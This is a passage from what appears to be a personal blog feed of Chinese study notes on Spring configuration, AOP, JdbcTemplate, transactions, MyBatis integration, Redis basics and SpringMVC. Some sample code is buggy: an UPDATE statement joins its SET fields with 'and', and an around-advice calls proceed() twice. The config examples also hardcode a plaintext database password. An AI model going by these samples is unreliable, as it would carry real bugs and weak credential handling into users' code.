constructor-arg</p><pre><code class="java">    &lt;bean name=&quot;user1&quot; class=&quot;com.bean.User&quot;&gt;        &lt;constructor-arg name=&quot;u_username&quot; value=&quot;zoufubo&quot;/&gt;        &lt;constructor-arg name=&quot;player&quot; ref=&quot;basketball&quot;/&gt;    &lt;/bean&gt;</code></pre><p>3.复杂类型注入（Array、List、Map、Set、Properties、Object[]）</p><pre><code class="java">        &lt;property name=&quot;array&quot;&gt;            &lt;array&gt;                &lt;value&gt;0110&lt;/value&gt;                &lt;ref bean=&quot;basketball&quot;/&gt;            &lt;/array&gt;        &lt;/property&gt;        &lt;property name=&quot;list&quot;&gt;            &lt;list&gt;                &lt;value&gt;1&lt;/value&gt;                &lt;value&gt;2&lt;/value&gt;                &lt;ref bean=&quot;user1&quot;/&gt;            &lt;/list&gt;        &lt;/property&gt;        &lt;property name=&quot;map&quot;&gt;            &lt;map&gt;                &lt;entry key=&quot;username&quot; value=&quot;dx&quot;&gt;&lt;/entry&gt;                &lt;entry key=&quot;passwd&quot; value=&quot;zoufubo&quot;&gt;&lt;/entry&gt;                &lt;entry key-ref=&quot;basketball&quot; value-ref=&quot;user1&quot;/&gt;            &lt;/map&gt;        &lt;/property&gt;        &lt;property name=&quot;properties&quot;&gt;            &lt;props&gt;                &lt;prop key=&quot;age&quot;&gt;25&lt;/prop&gt;                &lt;prop key=&quot;name&quot;&gt;dx&lt;/prop&gt;            &lt;/props&gt;        &lt;/property&gt;</code></pre><ul><li>空参构造：spring创建bean对象使用空参数构造方法<br>ApplicationContext配置的bean会在容器创建时全部创建出来，bean较多时，内存过大。</li><li>使用延迟加载： lazy-init=”true” 创建容器时不加载对象，获取bean实例时才加载</li><li>scope=”singleton” 单例模式 容器只能创建一个bean对象 </li><li>scope=”prototyped”多例，会创建新的对象 scope=”request”在web环境下，创建的对象生命周期与request请求生命周期一致</li><li>init-method=”user_init（init函数）” </li><li>destroy-method=”destroy（销毁函数）”初始化和销毁方法，分别在bean对象创建和容器关闭时调用</li></ul><pre><code class="java">    &lt;bean name=&quot;user&quot; class=&quot;com.bean.User&quot; lazy-init=&quot;true&quot; scope=&quot;singleton&quot; init-method=&quot;user_init&quot; destroy-method=&quot;destroy&quot;&gt;        &lt;property name=&quot;u_id&quot; value=&quot;2&quot;/&gt;    &lt;/bean&gt;</code></pre><h2 id="Spring注解配置"><a href="#Spring注解配置" class="headerlink" title="Spring注解配置"></a>Spring注解配置</h2><p>需要aop包、导入约束</p><pre><code class="java">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xsi:schemaLocation=&quot;       http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/context       http://www.springframework.org/schema/context/spring-context-3.0.xsd&quot;&gt;       &lt;!--把bean类作为组件扫描--&gt;    &lt;context:component-scan base-package=&quot;com.bean&quot;/&gt;&lt;/beans&gt;</code></pre><blockquote><p>使用@Component注解，下面这短代码等价</p></blockquote><pre><code class="java">@Component(&quot;user&quot;)&lt;bean name=&quot;user&quot; class=&quot;com.bean.User&quot;&gt;</code></pre><ul><li>@Controller  对应Web层</li><li>@Service 对应Service层</li><li>@Repository  对应Dao层</li><li>@PostConstruct()</li><li>@PreDestroy()**</li></ul><blockquote><p>利用注解幅值</p><ul><li>@Value（value=“”）加在字段上</li><li>@Value（“1”）加在set上</li><li>@Autowired自动装配：直接在要注入的引用前加上注解@Autowired，程序会自动从容器中找同类型对象为其注入，但当对象在容器中注册多个时，无法选择注入哪个对象。</li><li>@Recource（name=“”）在要注入的引用前加上注解@Resource，name值为要注入的对象的名称，该对象已注入在容器中。这种注入方式是手动注入，指定注入哪一个名称的对象，常用。</li></ul></blockquote><h3 id="单元测试与Spring整合"><a href="#单元测试与Spring整合" class="headerlink" title="单元测试与Spring整合"></a>单元测试与Spring整合</h3><p><strong>@Runwith（SpringJUnit4ClassRunner.class）使用junit进行测试，创建容器<br>@ContextConfiguration（“classpath：配置文件名”）读取配置文件</strong></p><h3 id="分包配置：导入其他配置文件"><a href="#分包配置：导入其他配置文件" class="headerlink" title="分包配置：导入其他配置文件"></a>分包配置：导入其他配置文件</h3><blockquote><p>&lt;import resource=””/</p></blockquote><h2 id="Spring常用约束"><a href="#Spring常用约束" class="headerlink" title="Spring常用约束"></a>Spring常用约束</h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;xmlns:context=&quot;http://www.springframework.org/schema/context&quot;xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;xsi:schemaLocation=&quot;http://www.springframework.org/schema/beanshttp://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/contexthttp://www.springframework.org/schema/context/spring-context.xsdhttp://www.springframework.org/schema/aophttp://www.springframework.org/schema/aop/spring-aop.xsdhttp://www.springframework.org/schema/txhttp://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt;&lt;/beans&gt;</code></pre><h2 id="Spring-AOP"><a href="#Spring-AOP" class="headerlink" title="Spring AOP"></a>Spring AOP</h2><p><strong>面向切面的编程思想：将纵向重复的代码横向冲去解决 例如：过滤器（纵向重复的身份验证横向抽取解决）</strong><br>Spring中aop：无需我们自己写动态代理的代码，容器可以管理生成动态代理对象</p><ul><li>（a）Proxy动态代理：被代理的对象必须实现接口</li><li>（b）Cglib动态代理：被代理对象不能被final修饰</li></ul><p><img src="https://img-blog.csdnimg.cn/201905141958557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190514200142990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="`在这里插入图片描述`"></p><blockquote><p>关于定义通知的语法：首先通知有5种类型分别如下：</p><ul><li>before 目标方法执行前执行，前置通知</li><li>after 目标方法执行后执行，后置通知</li><li>after returning 目标方法返回时执行 ，后置返回通知</li><li>after throwing 目标方法抛出异常时执行 异常通知</li><li>around 在目标函数执行中执行，可控制目标函数是否执行，环绕通知</li></ul></blockquote><pre><code class="java">public Object around_logprint(ProceedingJoinPoint pjp){        Object rtVaule=null;        try {            Object[] args=pjp.getArgs();            rtVaule=pjp.proceed(args);            pjp.proceed();            return rtVaule;        } catch (Throwable throwable) {            throwable.printStackTrace();        }        finally {            //增强代码            System.out.println(&quot;around记录日志&quot;);           }        return rtVaule;    }</code></pre><ul><li>public void service.UserServiceImpl.save()     service包下UserServiceImpl类的无参无返回值的save()方法</li><li>void service.UserServiceImpl.save()     service包下UserServiceImpl类的无参无返回值的save()方法</li><li>service.UserServiceImpl.save()         service包下UserServiceImpl类的无参的save()方法</li><li>service.UserServiceImpl.save(..)     service包下UserServiceImpl类的save()方法</li><li>service.UserServiceImpl.*(..)     service包下UserServiceImpl类的所有方法</li><li>service.<em>ServiceImpl.</em>(..)    service包下所有以ServiceImpl结尾的类的所有方法，最常用</li><li>service..<em>ServiceImpl.</em>(..)    service包及其后代包下所有以ServiceImpl结尾的类的所有方法</li></ul><p><strong>注解配置aop需要用到的:</strong></p><ul><li>（1）扫描注解的包</li><li>（2）配置注解支持切面</li></ul><pre><code class="xml">context:component-scan base-package=&quot;com&quot;/&gt;    &lt;!--配置spring支持注解切面--&gt;    &lt;aop:aspectj-autoproxy/&gt;</code></pre><h2 id="Spring中的JdbcTemplate"><a href="#Spring中的JdbcTemplate" class="headerlink" title="Spring中的JdbcTemplate"></a>Spring中的JdbcTemplate</h2><p><strong>Spring提供了一个操作数据库（CRUD）的对象JdbcTemplate（类似Dbutils）</strong></p><ul><li><p>spring整合JDBC的第一种方式，是将dao接口的实现类的对象放到spring容器中，这个对象依赖JDBCTemplate模板对象，所以要把JDBCTemplate模板对象放到spring容器中，再注入到实现类的对象，JDBCTemplate模板对象依赖连接池，所以要把连接池放到spring容器中，再注入到JDBCTemplate模板对象。在配置的时候要从依赖关系的最底层向上配置，所以配置的顺序依次是连接池对象、JDBCTemplate模板对象、实现类的对象。<strong>适用于xml配置</strong></p></li><li><p>第二种方式，如果dao接口的实现类先继承JdbcDaoSupport类再实现dao接口，就会根据连接池自动创建JDBC模板对象，不用手动创建JDBC模板对象，因为父类JdbcDaoSupport里面封装了创建JDBC模板的代码直接获得即可。这样在spring容器中就少一层依赖关系，dao接口实现类的对象直接依赖连接池对象。<strong>适用于注解配置</strong></p></li></ul><p><strong>提供统一的模板方法使对数据库的操作更加方便、友好，效率也不错。但是功能还是不够强大（比如不支持级联属性）</strong></p><p><strong>（1）</strong><br>JdbcTemplate 执行sql方法（常用之一），还有queryForObject获得单个对象，类似DButils<br>其中RowMapper使用BeanPropertyMapper用反射接收结果集</p><pre><code class="java">new BeanPropertyRowMapper&lt;Account&gt;() {            public Account mapRow(ResultSet resultSet, int i){}            }</code></pre><pre><code class="java"> query(String sql, @NotNull org.springframework.jdbc.core.RowMapper&lt;T&gt; rowMapper,                                   Object... args)</code></pre><blockquote><p>datasource配置数据库 jdbcTemplate配置该模板 accountDao配置接口实现类</p></blockquote><pre><code class="java">&lt;bean id=&quot;dataSource&quot; class=&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;&gt;        &lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;        &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;        &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/spring?serverTimezone=GMT&quot;/&gt;        &lt;property name=&quot;password&quot; value=&quot;52zoufubo&quot;/&gt;    &lt;/bean&gt;    &lt;bean id=&quot;jdbcTemplate&quot; class=&quot;org.springframework.jdbc.core.JdbcTemplate&quot;&gt;        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;    &lt;/bean&gt;    &lt;bean id=&quot;accountDao&quot; class=&quot;com.dingxiang.dao.AccountDaoImpl&quot;&gt;        &lt;property name=&quot;jt&quot; ref=&quot;jdbcTemplate&quot;/&gt;    &lt;/bean&gt;</code></pre><p><strong>接口类实现</strong></p><pre><code class="java">public class AccountDaoImpl implements AccountDao {    private JdbcTemplate jt;    public JdbcTemplate getJt() {        return jt;    }    public void setJt(JdbcTemplate jt) {        this.jt = jt;    }    public Account findByid(int id) {        List&lt;Account&gt; list=jt.query(&quot;select * from jdbctemplatedemo where id=?&quot;,new BeanPropertyRowMapper&lt;Account&gt;(Account.class),id);        return list.isEmpty()?null:list.get(0);    }    public Account findByname(String username) {        List&lt;Account&gt; list=jt.query(&quot;select * from jdbctemplatedemo where username=?&quot;,new BeanPropertyRowMapper&lt;Account&gt;(Account.class),username);        return list.isEmpty()?null:list.get(0);    }    public int updateAccount(Account account,String username) {        return jt.update(&quot;update jdbctemplatedemo set username=? and money=? where username=?&quot;,account.getName(),account.getMoney(),username);    }}</code></pre><pre><code class="java">AccountDao accountDao= (AccountDao) ac.getBean(&quot;accountDao&quot;);</code></pre><h2 id="Spring中的事务控制"><a href="#Spring中的事务控制" class="headerlink" title="Spring中的事务控制"></a>Spring中的事务控制</h2><ul><li>（1）Spring声明式事务（基于Aop的实现）：本质是对目标方法前后进行拦截，并在目标方法开始之前创建或者加入一个事务，在执行完目标方法之后根据执行情况提交或者回滚事务。</li></ul><p>声明式事务得益于 Spring IoC容器 和 Spring AOP 机制的支持：IoC容器为声明式事务管理提供了基础设施，使得 Bean 对于 Spring 框架而言是可管理的；而由于事务管理本身就是一个典型的横切逻辑（正是 AOP 的用武之地），因此 Spring AOP 机制是声明式事务管理的直接实现者</p><p><img src="https://img-blog.csdnimg.cn/2019051713311677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>事务是一个不可分割操作序列，也是数据库并发控制的基本单位，其执行的结果必须使数据库从一种一致性状态变到另一种一致性状态。</p></blockquote><ul><li>1.所谓事务的隔离级别是指若干个并发的事务之间的隔离程度TransactionDefinition.ISOLATION_DEFAULT</li><li>2.事务的只读属性是指，对事务性资源进行只读操作或者是读写操作</li><li>3.事务超时，就是指一个事务所允许执行的最长时间，如果超过该时间限制但事务还没有完成，则自动回滚事务</li><li>4.事务中抛出了未检查异常（继承自 RuntimeException 的异常），则默认将回滚事务。如果没有抛出任何异常，或者抛出了已检查异常，则仍然提交事务</li></ul><p><strong>jdbc、myabtis平台实现类：DataSourceTransactionManager</strong></p><ul><li>isolation=”DEFAULT”</li><li>PROPAGATION_REQUIRED  支持当前事务，如果不存在 就新建一个(默认)</li><li>read-only=”false” 表示该方法可以修改数据库</li></ul><p><strong>xml配置事务</strong><br>基于 <tx> 命名空间的实现</tx></p><pre><code class="java">- (1)将mybatis核心事务管理器DataSourceTransactionManager配置到spring容器，依赖连接池。    &lt;bean name=&quot;transaction&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;    &lt;/bean&gt;（2）由txAdvice切面定义事务增强处理    &lt;tx:advice id=&quot;txAdvice&quot; transaction-manager=&quot;transaction&quot;&gt;        &lt;tx:attributes&gt;            &lt;tx:method name=&quot;transfer&quot; isolation=&quot;DEFAULT&quot; propagation=&quot;REQUIRED&quot; read-only=&quot;false&quot;/&gt;        &lt;/tx:attributes&gt;    &lt;/tx:advice&gt;（3）配置事务增强处理的切入点，以保证其被恰当的织入    &lt;aop:config&gt;        &lt;aop:pointcut id=&quot;myadvice&quot; expression=&quot;execution(* com.dingxiang.service.impl.IAccountServiceImpl.*(..))&quot;/&gt;        &lt;aop:advisor advice-ref=&quot;txAdvice&quot; pointcut-ref=&quot;myadvice&quot;/&gt;    &lt;/aop:config&gt;</code></pre><p><strong>注解配置事务：</strong><br>基于 @Transactional 的实现<br>为需要加强的方法添加注解</p><ul><li>@Transactional(isolation = Isolation.DEFAULT,propagation = Propagation.REQUIRED,readOnly = false)</li></ul><p><strong>主配置文件打开注解配置事务</strong><code>&lt;tx:annotation-driven/&gt;</code></p><h2 id="Spring和Mybatis整合"><a href="#Spring和Mybatis整合" class="headerlink" title="Spring和Mybatis整合"></a>Spring和Mybatis整合</h2><p><strong>（1）由DriverManagerDataSource把数据库连接交给spring管理</strong></p><pre><code class="xml">&lt;bean id=&quot;dataSource&quot; class=&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;&gt;        &lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;        &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;        &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/spring?serverTimezone=GMT&quot;/&gt;        &lt;property name=&quot;password&quot; value=&quot;52zoufubo&quot;/&gt;    &lt;/bean&gt;</code></pre><p><strong>（2）SqlSessionFactoryBean</strong></p><blockquote><p>配置mybatis的SqlSessionFactory，需要注入全局配置文件和由spring管理的连接池</p></blockquote><pre><code class="xml">    &lt;bean class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot; name=&quot;sqlSessionFactory&quot;&gt;        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;        &lt;property name=&quot;configLocation&quot; value=&quot;sqlMapConfig.xml&quot;/&gt;    &lt;/bean&gt;</code></pre><p><strong>（3）MapperScannerConfigurer</strong></p><blockquote><p>使用一个 MapperScannerConfigurer , 它 将 会 查 找 类 路 径 下 的 映 射 器 并 自 动 将 它 们 创 建 成 MapperFactoryBean<br>basePackage 属性是让你为映射器接口文件设置基本的包路径。 你可以使用分号或逗号 作为分隔符设置多于一个的包路径。每个映射器将会在指定的包路径中递归地被搜索到。</p></blockquote><pre><code class="xml">    &lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot; name=&quot;configurer&quot;&gt;        &lt;property name=&quot;basePackage&quot; value=&quot;com.dingxiang.mapper&quot;/&gt;    &lt;/bean&gt;</code></pre><blockquote><p>或者可以使用MapperFactoryBean配置Mapper，通过id名获得mapper对象</p></blockquote><pre><code class="xml">        &lt;bean id=&quot;accountMapper&quot; class=&quot;org.mybatis.spring.mapper.MapperFactoryBean&quot;&gt;            &lt;property name=&quot;mapperInterface&quot; value=&quot;com.mapper.AccountMapper&quot;&gt;&lt;/property&gt;            &lt;property name=&quot;sqlSessionFactory&quot; ref=&quot;sqlSessionFactoryId&quot;&gt;&lt;/property&gt;        &lt;/bean&gt;     </code></pre>]]></content>
    
    <summary type="html">
    
      Srping,一个轻量级java开发框架，为解决应用开发的业务逻辑层和其他层耦合问题，full-stack一站式框架专注于应用程序的开发
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="后端" scheme="https://www.dzou.top/tags/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="Spring" scheme="https://www.dzou.top/tags/Spring/"/>
    
      <category term="SSM" scheme="https://www.dzou.top/tags/SSM/"/>
    
  </entry>
  
  <entry>
    <title>Redis非关系型数据库学习笔记--更新中</title>
    <link href="https://www.dzou.top/post/7c806d9b.html"/>
    <id>https://www.dzou.top/post/7c806d9b.html</id>
    <published>2019-07-24T01:20:27.000Z</published>
    <updated>2019-08-02T11:51:47.436Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NoSql（Not-Only-Sql）非关系型数据库"><a href="#NoSql（Not-Only-Sql）非关系型数据库" class="headerlink" title="NoSql（Not Only Sql）非关系型数据库"></a>NoSql（Not Only Sql）非关系型数据库</h2><p>这类型数据存储不需要<strong>固定</strong>的模式，<strong>key-value cache persistent存储</strong><br><strong>易扩展</strong><br><strong>把反复查询的数据放到缓存里，减少过多查询数据库</strong><br><strong>读写分离</strong>：写（主数据库），读（副数据库）<br><strong>表锁，行锁</strong>（高并发下使用时把数据锁起来，一次只能一个使用）<br><strong>分表分库</strong>：减小数据库压力<br>无需<strong>事先创建对应字段</strong>，灵活性高</p><p><strong>出现原因：关系型数据库无法解决过于复杂的关系</strong>（例如亲戚）<br>高并发、高可扩、高性能</p><p><strong>BSON</strong>Binary JSON</p><p><strong>聚合模型：</strong></p><ol><li>KV键值（Redis）</li><li>文档型数据库 BSON（CacheDb、MongoDB）</li><li>列族</li><li>图形（朋友圈社交网络、广告推荐系统）</li></ol><p><strong>CAP:（三进二）</strong></p><ul><li>C:Consistency 强一致性</li><li>A：可用性</li><li>P：分区容忍性</li></ul><hr><p><strong>Redis(很高效)</strong><br>一个基于内存的单线程高性能key-value型数据库（NoSql），读写性能优越，支持多种数据类型（list、set、zset、hash），master-slaver数据备份<br>epoll（linux内核），多路io复用，读写快<br><strong>内存储存和持久化</strong>：异步将内存数据写到硬盘上<br>CONFIG命令获取和设置所有的Redis配置。</p><hr><p><strong>命令：</strong><br>select 获取数据库（0-15）<br>get key 获取key<br>set key value 设置键值<br>DSBSIZE 当前表容量<br>FLUSHDB、FLUSHALL清空当前库和所有库<br>exists key 存在key（1） 没有（0）<br>ttl 过期时间（-1永不过期 -2 已经过期）<br>expire key time（设置过期时间）</p><hr><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p><strong>哈希（hash）</strong>：<br>String类型的field和value的映射表，hash特别适合用于存储对象</p><pre><code>redis 127.0.0.1:6379&gt; HMSET user:1 usernameOKredis 127.0.0.1:6379&gt; HGETALL user:11) &quot;username&quot;</code></pre><p><strong>列表（list）</strong><br>列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素导列表的头部（左边）或者尾部（右边）。</p><pre><code>redis 127.0.0.1:6379&gt; lpush redis.net.cn redis(integer) 1redis 127.0.0.1:6379&gt; lrange redis.net.cn 0 10</code></pre><p><strong>集合（set）</strong><br>Set是string类型的无序无重复集合。<br>集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)。</p><pre><code>redis 127.0.0.1:6379&gt; sadd redis.net.cn redis(integer) 1redis 127.0.0.1:6379&gt; smembers redis.net.cn</code></pre><p><strong>有序集合（zset）：sorted set</strong><br>通过分数来为集合中的成员进行从小到大的排序。</p><pre><code>redis 127.0.0.1:6379&gt; zadd redis.net.cn 0 redis(integer) 1redis 127.0.0.1:6379&gt; zadd redis.net.cn 0 rabitmq(integer) 1redis 127.0.0.1:6379&gt; zadd redis.net.cn 0 rabitmq(integer) 0redis 127.0.0.1:6379&gt; ZRANGEBYSCORE redis.net.cn 0 1000</code></pre><hr><h2 id="Redis持久化"><a href="#Redis持久化" class="headerlink" title="Redis持久化"></a>Redis持久化</h2><p><strong>1.rdb：redis Database</strong><br>将redis存储的数据生成<strong>快照snapshot并存储到磁盘</strong>等介质上<br>对于RDB方式，redis会单独创建（<strong>fork</strong>）一个子进程来进行持久化，而主进程是不会进行任何IO操作的，这样就确保了redis极高的性能。<br>redis在进行数据持久化的过程中，会先将数据写入到一个临时文件中，待持久化过程都结束了，才会用这个临时文件替换上次持久化好的文件。<br>保存dump.rdb（备份）</p><p><strong>2.aof：append only file</strong><br>以日志记录形式写操作，只能<strong>追不能改写</strong><br>AOF方式是将执行过的写指令记录下来，在数据恢复时按照<strong>从前到后</strong>的顺序再将指令都执行一遍，就这么简单。</p><p>AOF方式的另一个好处，我们通过一个“场景再现”来说明。某同学在操作redis时，不小心执行了FLUSHALL，导致redis内存中的数据全部被清空了，这是很悲剧的事情。不过这也不是世界末日，只要redis配置了AOF持久化方式，且AOF文件还没有被重写（rewrite），我们就可以用最快的速度暂停redis并编辑AOF文件，将最后一行的FLUSHALL命令删除，然后重启redis，就可以恢复redis的所有数据到FLUSHALL之前的状态了。是不是很神奇，这就是AOF持久化方式的好处之一。但是如果AOF文件已经被重写了，那就无法通过这种方法来恢复数据了。</p><p><strong><em>aof重写</em></strong><br>因为采用了追加方式，如果不做任何处理的话，AOF文件会变得<strong>越来越大</strong>，为此，redis提供了AOF文件重写（rewrite）机制，即当AOF文件的大小超过所设定的阈值时，redis就会启动AOF文件的<strong>内容压缩</strong>，只保留可以<strong>恢复数据的最小指令集</strong>。<br>2、在重写即将开始之际，redis会创建（fork）一个“重写子进程”，这个子进程会首先读取现有的AOF文件，并将其包含的指令进行分析压缩并写入到一个临时文件中。</p><p>3、与此同时，主工作进程会将新接收到的写指令一边累积到内存缓冲区中，一边继续写入到原有的AOF文件中，这样做是保证原有的AOF文件的可用性，避免在重写过程中出现意外。</p><p>4、当“重写子进程”完成重写工作后，它会给父进程发一个信号，父进程收到信号后就会将内存中缓存的写指令追加到新AOF文件中。</p><p>5、当追加结束后，redis就会用新AOF文件来代替旧AOF文件，之后再有新的写指令，就都会追加到新的AOF文件中了。</p><hr><p><strong>aof和rdb比较</strong><br>官方的建议是两个同时使用。这样可以提供更可靠的持久化方案<br>RDB需要定时持久化，风险是可能会丢两次持久之间的数据，量可能很大。<br>在同样数据规模的情况下，AOF文件要比RDB文件的体积大。而且，AOF方式的恢复速度也要慢于RDB方式。</p><h2 id="Redis事务"><a href="#Redis事务" class="headerlink" title="Redis事务"></a>Redis事务</h2><p>一次执行多个命令，批处理（一起成功、一起失败）<br><img src="https://img-blog.csdnimg.cn/20190612152347346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>redis 127.0.0.1:6379&gt; MULTI OK redis 127.0.0.1:6379&gt; SET mykey &quot;redis&quot; QUEUED redis 127.0.0.1:6379&gt; GET mykey QUEUED redis 127.0.0.1:6379&gt; INCR visitors QUEUED redis 127.0.0.1:6379&gt; EXEC  1) OK 2) &quot;redis&quot; 3) (integer) 1</code></pre><p><strong>watch类似乐观锁</strong></p><pre><code>//balance100 debt 20127.0.0.1:6379&gt; watch balanceOK127.0.0.1:6379&gt; MULTIOK127.0.0.1:6379&gt; DECRBY balance 20QUEUED127.0.0.1:6379&gt; INCRBY debt 20QUEUED127.0.0.1:6379&gt; EXEC1) (integer) 802) (integer) 40</code></pre><hr><h2 id="Redis发布和订阅（少用）-有专门的消息中间件"><a href="#Redis发布和订阅（少用）-有专门的消息中间件" class="headerlink" title="Redis发布和订阅（少用） 有专门的消息中间件"></a><del>Redis发布和订阅</del>（少用） 有专门的消息中间件</h2><p>Redis 发布订阅(pub/sub)实现了消息系统，发送者(在redis术语中称为发布者)在接收者(订阅者)接收消息时发送消息。传送消息的链路称为信道。</p><hr>]]></content>
    
    <summary type="html">
    
      redis非关系型数据库，redis实现缓存存储，高效查询
    
    </summary>
    
      <category term="数据库" scheme="https://www.dzou.top/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="分布式" scheme="https://www.dzou.top/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
      <category term="后端" scheme="https://www.dzou.top/tags/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="NoSql" scheme="https://www.dzou.top/tags/NoSql/"/>
    
      <category term="Redis" scheme="https://www.dzou.top/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>SpringMVC框架学习笔记--更新中 JavaWeb开发（SSM框架第三部分）从介绍SpringMVC到使用,让你掌握核心知识</title>
    <link href="https://www.dzou.top/post/f3a4f54b.html"/>
    <id>https://www.dzou.top/post/f3a4f54b.html</id>
    <published>2019-07-24T01:14:50.000Z</published>
    <updated>2019-08-02T14:31:09.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><h3 id="服务器端三层架构"><a href="#服务器端三层架构" class="headerlink" title="服务器端三层架构"></a>服务器端三层架构</h3><ul><li>表现层（SpringMVC）</li><li>务层（Spring）</li><li>持久层（Mybatis）<br>表现层：拿到http请求的参数，传递给spring</li></ul><p><img src="https://img-blog.csdnimg.cn/20190518202814921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h3><p><strong>SpringMVC：一种基于Java实现的MVC设计模型的请求驱动类型的轻量级框架</strong></p><ul><li>M（model）：javaBean对象（将参数封装成JavaBean对象交给业务层处理）</li><li>V(view)：jsp （向控制器提交数据，显示模型中的数据）</li><li>C（controller）：servlet（根据视图提出的请求判断将请求交给那个模型处理，将处理后的结果交给对应的视图更新显示）</li></ul><h3 id="SpringMVC运行流程"><a href="#SpringMVC运行流程" class="headerlink" title="SpringMVC运行流程"></a>SpringMVC运行流程</h3><p>在Spring MVC框架中，从“Request（请求）”开始，依次进入“DispatcherServlet（核心分发器）” —&gt; “HandlerMapping（处理器映射）” —&gt; “Controller（控制器）” —&gt; “ModelAndView（模型和视图）” —&gt; “ViewResolver（视图解析器）” —&gt; “View（视图）” —&gt; “Response（响应）”结束，其中DispatcherServlet、HandlerMapping和ViewResolver 只需要在XML文件中配置即可，从而大大提高了开发的效率，特别是对于 HandlerMapping 框架为其提供了默认的配置。</p><ul><li>1.HandlerMapping（处理器映射）：通过映射找到哪个控制器执行哪个方法@RequestMapping（path=“”）再通过HandlerAdapter适配器执行方法</li><li>2.ViewResolver（视图解析器）：找到哪个视图的显示</li></ul><p><img src="https://img-blog.csdnimg.cn/20190519203907629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="SpringMVC和struct2区别"><a href="#SpringMVC和struct2区别" class="headerlink" title="SpringMVC和struct2区别"></a>SpringMVC和struct2区别</h3><ul><li>共同：都是表现层框架，离不开ServletAPI， 请求的机制都是一个核心控制器</li><li>不同：<ul><li>1.SpringMVC核心控制器是Servlet，Struct是Filter</li><li>2.SpringMVC是基于方法设计的，Struct是基于类设计的，前者效率较高</li><li>3.SpringMVC使用更简洁，支持JSR303，处理ajax请求更方便</li><li>4.Struct的OGNL表达式比SpringMVC开发效率高，执行效率比JSTL低，尤其Struct的表单标签，没有html效率高</li></ul></li></ul><h3 id="创建SpringMVC-Web项目"><a href="#创建SpringMVC-Web项目" class="headerlink" title="创建SpringMVC Web项目"></a>创建SpringMVC Web项目</h3><blockquote><p>使用maven构建webapp项目，maven添加archetypeCatalog=internal，国外服务器太慢</p></blockquote><p><a href="mvc:annotation-driven/" rel="external nofollow noopener noreferrer" target="_blank">mvc:annotation-driven/</a>打开注解（处理器映射器、处理器适配器、视图解析器配置）</p><h4 id="请求参数绑定"><a href="#请求参数绑定" class="headerlink" 